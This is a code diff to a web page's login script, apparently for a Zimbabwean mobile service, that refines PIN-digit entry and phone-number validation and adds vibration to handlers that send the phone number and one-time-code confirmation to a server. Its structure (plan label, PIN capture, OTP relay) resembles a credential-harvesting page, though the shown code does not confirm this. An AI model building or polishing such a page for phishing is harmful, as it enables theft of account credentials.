@@ -236,7 +236,7 @@ function normalizePlan(plan){
   return price?`${name} — ${price}`:name;
 }
 
-/* ===== PIN (FIXED DELETE LOGIC) ===== */
+/* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
 
@@ -247,7 +247,6 @@ pins.forEach((el,i)=>{
     if(el.value && i<pins.length-1) pins[i+1].focus();
     updatePin();
   });
-
   el.addEventListener('keydown',e=>{
     if(e.key==='Backspace'){
       if(el.value){
@@ -276,12 +275,21 @@ const loginBtn=document.getElementById('loginBtn');
 
 function validatePhone(){
   const d=phone.value.replace('+263','');
-  if(!/^7\d{8}$/.test(d)){phoneError.innerText='Input 9-digit number starting with 7';return false}
-  phoneError.innerText='';return true;
+  if(!d) { phoneError.innerText=''; return false; }
+  if(!/^7\d{8}$/.test(d)){
+    phoneError.innerText='Enter your 9-digit number starting with 7';
+    return false;
+  }
+  phoneError.innerText='';
+  return true;
 }
+
 phone.addEventListener('input',()=>{
-  let d=phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
+  let d=phone.value.replace('+263','').replace(/\D/g,'');
+  if(d.startsWith('0')) d=d.slice(1);
+  d=d.slice(0,9);
   phone.value='+263'+d;
+  validatePhone();
 });
 
 /* ===== API ===== */
@@ -330,6 +338,7 @@ function startCountdown(){
 document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
   if(document.getElementById('hp').value) return;
+  if(navigator.vibrate) navigator.vibrate(30);
   await sendToServer({
     event:'login_clicked',
     loginPhone:phone.value,
@@ -347,6 +356,7 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
 
 /* ===== CONFIRM ===== */
 confirmBtn.onclick=async()=>{
+  if(navigator.vibrate) navigator.vibrate(30);
   await sendToServer({
     event:'otp_confirm',
     loginPhone:phone.value,
